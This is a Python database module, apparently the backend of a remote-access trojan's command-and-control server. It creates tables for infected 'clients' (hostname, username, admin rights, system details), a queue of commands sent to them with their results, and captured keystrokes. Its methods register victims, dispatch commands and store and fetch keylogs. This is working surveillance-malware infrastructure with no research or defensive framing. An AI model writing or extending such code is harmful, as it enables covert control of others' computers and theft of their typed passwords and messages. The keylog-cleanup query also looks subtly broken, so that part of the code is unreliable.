import psycopg2
from psycopg2.extras import RealDictCursor
import json
import os
from datetime import datetime
import time


class DatabaseManager:
    def __init__(self, database_url=None):
        """Initialize database connection with Supabase/PostgreSQL"""
        self.database_url = database_url or os.getenv('DATABASE_URL')
        self.conn = None
        self.connect()
    
    def connect(self):
        """Establish database connection"""
        try:
            if self.database_url:
                self.conn = psycopg2.connect(self.database_url, cursor_factory=RealDictCursor)
                self.conn.autocommit = True
                print("[DB] Connected to PostgreSQL database")
                self.init_tables()
            else:
                print("[DB] No database URL provided - using in-memory storage")
        except Exception as e:
            print(f"[DB] Connection error: {e}")
            self.conn = None
    
    def init_tables(self):
        """Create tables if they don't exist"""
        if not self.conn:
            return
        
        try:
            cursor = self.conn.cursor()
            
            # Clients table with detailed machine information
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS clients (
                    client_id VARCHAR(255) PRIMARY KEY,
                    ip VARCHAR(45),
                    hostname VARCHAR(255),
                    os_type VARCHAR(50),
                    os_version VARCHAR(255),
                    os_release VARCHAR(255),
                    architecture VARCHAR(50),
                    cpu_count INTEGER,
                    cpu_model VARCHAR(255),
                    total_ram BIGINT,
                    username VARCHAR(255),
                    computer_name VARCHAR(255),
                    is_admin BOOLEAN DEFAULT FALSE,
                    system_info JSONB,
                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    checkin_count INTEGER DEFAULT 0
                )
            """)
            
            # Commands table (merged with results)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS commands (
                    id SERIAL PRIMARY KEY,
                    client_id VARCHAR(255) REFERENCES clients(client_id) ON DELETE CASCADE,
                    command_type VARCHAR(50),
                    command_data JSONB,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    status VARCHAR(20) DEFAULT 'pending',
                    executed_at TIMESTAMP,
                    result_data JSONB,
                    error_message TEXT,
                    execution_time FLOAT
                )
            """)
            
            # Keylogs table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS keylogs (
                    id SERIAL PRIMARY KEY,
                    client_id VARCHAR(255) REFERENCES clients(client_id) ON DELETE CASCADE,
                    keystrokes TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    metadata JSONB
                )
            """)
            
            # Create indexes for performance
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_clients_os_type ON clients(os_type)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_clients_hostname ON clients(hostname)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands(client_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_keylogs_client_id ON keylogs(client_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_keylogs_timestamp ON keylogs(timestamp)")
            
            cursor.close()
            print("[DB] Tables initialized successfully")
        except Exception as e:
            print(f"[DB] Error initializing tables: {e}")
    
    # ==================== CLIENT OPERATIONS ====================
    
    def register_client(self, client_id, system_info, ip):
        """Register or update a client with detailed machine information"""
        if not self.conn:
            print(f"[DB] No connection - cannot register client {client_id}")
            return False
        
        try:
            print(f"[DB] Attempting to register client {client_id}")
            print(f"[DB] System info keys: {list(system_info.keys())}")
            
            # Extract detailed information from system_info with safe fallbacks
            platform_info = system_info.get('platform', {})
            hardware_info = system_info.get('hardware', {})
            user_info = system_info.get('user', {})
            privileges_info = system_info.get('privileges', {})
            
            print(f"[DB] Platform info: {bool(platform_info)}, Hardware: {bool(hardware_info)}")
            
            # Fallback: check if old format is used
            if not platform_info and 'operating_system' in system_info:
                print("[DB] Using old format fallback")
                # Old format detected - extract from it
                os_info = system_info.get('operating_system', {})
                user_data = system_info.get('user', {})
                arch_info = system_info.get('architecture', {})
                cpu_info = arch_info.get('CPU', {}) if arch_info else {}
                mem_info = arch_info.get('Memory', {}) if arch_info else {}
                
                platform_info = {
                    'hostname': user_data.get('computer_name', 'Unknown'),
                    'system': os_info.get('System', 'Unknown'),
                    'version': os_info.get('Version', 'Unknown'),
                    'release': os_info.get('Release', 'Unknown'),
                    'machine': os_info.get('Machine', cpu_info.get('Architecture', 'Unknown'))
                }
                hardware_info = {
                    'cpu_count': cpu_info.get('Physical Cores', 0),
                    'cpu_model': cpu_info.get('Model', 'Unknown'),
                    'total_ram': int(mem_info.get('Total GB', 0) * 1024 * 1024 * 1024) if mem_info else 0
                }
                user_info = {
                    'username': user_data.get('username', 'Unknown'),
                    'computer_name': user_data.get('computer_name', 'Unknown')
                }
                privileges_info = system_info.get('privileges', {})
                print(f"[DB] Converted old format - hostname: {platform_info.get('hostname')}")
            
            print(f"[DB] Final values - hostname: {platform_info.get('hostname')}, os: {platform_info.get('system')}")
            
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO clients (
                    client_id, ip, hostname, os_type, os_version, os_release, 
                    architecture, cpu_count, cpu_model, total_ram, username, 
                    computer_name, is_admin, system_info, first_seen, last_seen, checkin_count
                )
                VALUES (
                    %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, 
                    CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1
                )
                ON CONFLICT (client_id) 
                DO UPDATE SET 
                    ip = EXCLUDED.ip,
                    hostname = EXCLUDED.hostname,
                    os_type = EXCLUDED.os_type,
                    os_version = EXCLUDED.os_version,
                    os_release = EXCLUDED.os_release,
                    architecture = EXCLUDED.architecture,
                    cpu_count = EXCLUDED.cpu_count,
                    cpu_model = EXCLUDED.cpu_model,
                    total_ram = EXCLUDED.total_ram,
                    username = EXCLUDED.username,
                    computer_name = EXCLUDED.computer_name,
                    is_admin = EXCLUDED.is_admin,
                    system_info = EXCLUDED.system_info,
                    last_seen = CURRENT_TIMESTAMP,
                    checkin_count = clients.checkin_count + 1
            """, (
                client_id,
                ip,
                platform_info.get('hostname', 'Unknown'),
                platform_info.get('system', 'Unknown'),
                platform_info.get('version', 'Unknown'),
                platform_info.get('release', 'Unknown'),
                platform_info.get('machine', 'Unknown'),
                hardware_info.get('cpu_count', 0),
                hardware_info.get('cpu_model', 'Unknown'),
                hardware_info.get('total_ram', 0),
                user_info.get('username', 'Unknown'),
                user_info.get('computer_name', 'Unknown'),
                privileges_info.get('is_admin', False),
                json.dumps(system_info)
            ))
            affected_rows = cursor.rowcount
            cursor.close()
            print(f"[DB] Client {client_id} registered successfully (affected rows: {affected_rows})")
            return True
        except Exception as e:
            print(f"[DB] ERROR registering client {client_id}: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def update_client_heartbeat(self, client_id):
        """Update client last_seen timestamp"""
        if not self.conn:
            return False
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                UPDATE clients 
                SET last_seen = CURRENT_TIMESTAMP,
                    checkin_count = checkin_count + 1
                WHERE client_id = %s
            """, (client_id,))
            cursor.close()
            return True
        except Exception as e:
            print(f"[DB] Error updating heartbeat: {e}")
            return False
    
    def get_client(self, client_id):
        """Get client information with detailed machine data"""
        if not self.conn:
            return None
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                SELECT client_id, ip, hostname, os_type, os_version, os_release,
                       architecture, cpu_count, cpu_model, total_ram, username,
                       computer_name, is_admin, system_info, first_seen, last_seen, checkin_count
                FROM clients 
                WHERE client_id = %s
            """, (client_id,))
            result = cursor.fetchone()
            cursor.close()
            return dict(result) if result else None
        except Exception as e:
            print(f"[DB] Error getting client: {e}")
            return None
    
    def get_all_clients(self):
        """Get all clients with detailed information"""
        if not self.conn:
            return []
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                SELECT client_id, ip, hostname, os_type, os_version, os_release,
                       architecture, cpu_count, cpu_model, total_ram, username,
                       computer_name, is_admin, system_info, first_seen, last_seen, checkin_count
                FROM clients 
                ORDER BY last_seen DESC
            """)
            results = cursor.fetchall()
            cursor.close()
            return [dict(row) for row in results]
        except Exception as e:
            print(f"[DB] Error getting all clients: {e}")
            return []
    
    def delete_inactive_clients(self, inactive_seconds=3600):
        """Delete clients inactive for more than specified seconds"""
        if not self.conn:
            return 0
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                DELETE FROM clients 
                WHERE EXTRACT(EPOCH FROM (CURRENT_TIMESTAMP - last_seen)) > %s
                RETURNING client_id
            """, (inactive_seconds,))
            deleted = cursor.fetchall()
            cursor.close()
            return len(deleted)
        except Exception as e:
            print(f"[DB] Error deleting inactive clients: {e}")
            return 0
    
    # ==================== COMMAND OPERATIONS ====================
    
    def add_pending_command(self, client_id, command_type, command_data):
        """Add a pending command for a client"""
        if not self.conn:
            return None
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO commands (client_id, command_type, command_data, status)
                VALUES (%s, %s, %s, 'pending')
                RETURNING id
            """, (client_id, command_type, json.dumps(command_data)))
            command_id = cursor.fetchone()['id']
            cursor.close()
            return command_id
        except Exception as e:
            print(f"[DB] Error adding pending command: {e}")
            return None
    
    def get_pending_commands(self, client_id):
        """Get all pending commands for a client"""
        if not self.conn:
            return []
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                SELECT id, command_type, command_data, created_at
                FROM commands 
                WHERE client_id = %s AND status = 'pending'
                ORDER BY created_at ASC
            """, (client_id,))
            results = cursor.fetchall()
            cursor.close()
            return [dict(row) for row in results]
        except Exception as e:
            print(f"[DB] Error getting pending commands: {e}")
            return []
    
    def update_command_result(self, command_id, result_data, execution_time=None, error_message=None):
        """Update command with result data (replaces mark_command_executed and store_command_result)"""
        if not self.conn:
            return False
        
        try:
            cursor = self.conn.cursor()
            status = 'failed' if error_message else 'executed'
            cursor.execute("""
                UPDATE commands 
                SET status = %s,
                    executed_at = CURRENT_TIMESTAMP,
                    result_data = %s,
                    error_message = %s,
                    execution_time = %s
                WHERE id = %s
            """, (status, json.dumps(result_data) if result_data else None, error_message, execution_time, command_id))
            cursor.close()
            return True
        except Exception as e:
            print(f"[DB] Error updating command result: {e}")
            return False
    
    def mark_command_executed(self, command_id):
        """Mark a command as executed (legacy method, use update_command_result instead)"""
        return self.update_command_result(command_id, None)
    
    def clear_pending_commands(self, client_id):
        """Clear all pending commands for a client"""
        if not self.conn:
            return False
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                DELETE FROM commands 
                WHERE client_id = %s AND status = 'pending'
            """, (client_id,))
            cursor.close()
            return True
        except Exception as e:
            print(f"[DB] Error clearing pending commands: {e}")
            return False
    
    def get_command_results(self, client_id, limit=100):
        """Get command results for a client (from unified commands table)"""
        if not self.conn:
            return []
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                SELECT id, command_type, command_data, result_data, 
                       status, created_at, executed_at, execution_time, error_message
                FROM commands 
                WHERE client_id = %s AND status IN ('executed', 'failed')
                ORDER BY executed_at DESC
                LIMIT %s
            """, (client_id, limit))
            results = cursor.fetchall()
            cursor.close()
            return [dict(row) for row in results]
        except Exception as e:
            print(f"[DB] Error getting command results: {e}")
            return []
    
    # ==================== KEYLOG OPERATIONS ====================
    
    def store_keylog(self, client_id, keystrokes, metadata=None):
        """Store keylog data"""
        if not self.conn:
            return None
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                INSERT INTO keylogs (client_id, keystrokes, metadata)
                VALUES (%s, %s, %s)
                RETURNING id
            """, (client_id, keystrokes, json.dumps(metadata or {})))
            keylog_id = cursor.fetchone()['id']
            cursor.close()
            return keylog_id
        except Exception as e:
            print(f"[DB] Error storing keylog: {e}")
            return None
    
    def get_keylogs(self, client_id, limit=1000):
        """Get keylogs for a client"""
        if not self.conn:
            return []
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                SELECT id, keystrokes, timestamp, metadata
                FROM keylogs 
                WHERE client_id = %s
                ORDER BY timestamp DESC
                LIMIT %s
            """, (client_id, limit))
            results = cursor.fetchall()
            cursor.close()
            return [dict(row) for row in results]
        except Exception as e:
            print(f"[DB] Error getting keylogs: {e}")
            return []
    
    def delete_old_keylogs(self, hours=24):
        """Delete keylogs older than specified hours"""
        if not self.conn:
            return 0
        
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                DELETE FROM keylogs 
                WHERE timestamp < CURRENT_TIMESTAMP - INTERVAL '%s hours'
                RETURNING id
            """, (hours,))
            deleted = cursor.fetchall()
            cursor.close()
            return len(deleted)
        except Exception as e:
            print(f"[DB] Error deleting old keylogs: {e}")
            return 0
    
    # ==================== UTILITY ====================
    
    def close(self):
        """Close database connection"""
        if self.conn:
            self.conn.close()
            print("[DB] Database connection closed")
